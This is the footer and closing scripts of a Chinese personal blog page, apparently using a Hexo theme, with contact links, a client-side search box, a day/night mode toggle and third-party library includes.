        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1078240421" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>

    <!-- 白天和黑夜主题 -->
<div class="sum-moon-box">
  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
  </a>
</div>

<script>
  function switchNightMode() {
    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
      setTimeout(function () {
        $('body').hasClass('DarkMode') 
        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
          
        setTimeout(function () {
          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
            $(this).remove()
          })
        }, 2e3)
      })
  }
</script>

    <script>
    //模式判断 
    if (localStorage.getItem('isDark') === '0') {
        document.body.classList.add('DarkMode');
        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
    } else {
        document.body.classList.remove('DarkMode');
        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
    }
    </script>

    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.js"></script>
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.js"></script>
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    
    <script async src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
